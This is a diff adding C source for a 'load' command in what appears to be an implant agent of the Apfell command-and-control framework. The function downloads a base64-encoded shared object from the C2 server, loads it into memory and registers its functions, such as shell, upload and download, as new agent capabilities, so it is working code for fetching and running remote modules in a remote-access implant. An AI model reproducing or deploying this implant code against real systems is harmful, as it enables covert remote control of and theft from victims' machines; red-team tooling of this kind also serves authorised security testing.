@@ -1,0 +1,51 @@
+/* takes in the parameter: {"command":"load",
+                            "params":{
+                                "file_id": 4,
+                                "cmds": "shell, upload, download"
+                            },
+                            "id":"task number"}
+* pulls down the file ID from the Apfell server and load it*/
+
+int load(cJSON* json){
+    cJSON* params = cJSON_Parse(cJSON_GetObjectItem(json, "params")->valuestring);
+    //create room for the file in memory
+    unsigned int file_length = 4096;
+    unsigned char * file_buffer = malloc(sizeof(char) * file_length);
+    //get the file from the Apfell server into local memory
+    unsigned int file_id = (unsigned int) cJSON_GetObjectItem(params, "file_id")->valueint;
+
+    global_info->C2.upload(file_id, &file_buffer, &file_length);
+
+    unsigned char *final_file_data = b64_decode(file_buffer, &file_length);
+
+    void* so_handle = get_so_handle(final_file_data, file_length);
+
+    if(so_handle == NULL){
+        send_basic_response("Failed to load module", cJSON_GetObjectItem(json, "id")->valueint);
+        return;
+    }
+    //iterate over all the commands in the cmds string and load each one
+    int (*fptr)(cJSON*);
+    char* separator = ", ";
+    char* cmd = strtok(cJSON_GetObjectItem(params, "cmds")->valuestring, separator);
+
+    while( cmd != NULL ) {
+        fptr = (int (*)(cJSON *)) dlsym(so_handle, cmd);
+        //*(void **)(&fptr) = dlsym(so_handle, cmd);
+        if( fptr ){
+            update_global_functions(cmd, fptr);
+        }else{
+            printf("failed to find function in .so: %s\n", cmd);
+        }
+        cmd = strtok(NULL, separator);
+    }
+    free(file_buffer);
+    free(final_file_data);
+    send_basic_response("Loaded commands", cJSON_GetObjectItem(json, "id")->valueint);
+    cJSON_Delete(json);
+    return SUCCESS;
+
+}
+
+COMMAND_ENDS_HERE
+int load(cJSON*);
